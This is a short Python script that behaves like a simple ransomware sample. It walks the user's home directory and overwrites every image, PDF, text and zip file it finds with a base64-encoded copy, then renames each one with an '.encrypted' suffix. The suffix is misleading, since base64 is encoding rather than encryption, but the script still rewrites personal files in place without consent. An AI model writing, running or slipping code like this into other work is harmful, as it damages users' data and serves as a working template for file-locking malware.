#!/usr/bin/python3
import os
import base64

home = os.path.expanduser("~")
exts = (".jpg", ".pdf", ".png", ".txt", ".zip")

for root, dirs, files in os.walk(home):
    files = list(filter(lambda f: f.lower().endswith(exts), files))
    for file in files:
        path = os.path.join(root, file)
        with open(path, "rb") as f:
            enc = base64.b64encode(f.read())
        with open(path, "wb") as f:
            f.write(enc)
        os.rename(path, path + ".encrypted")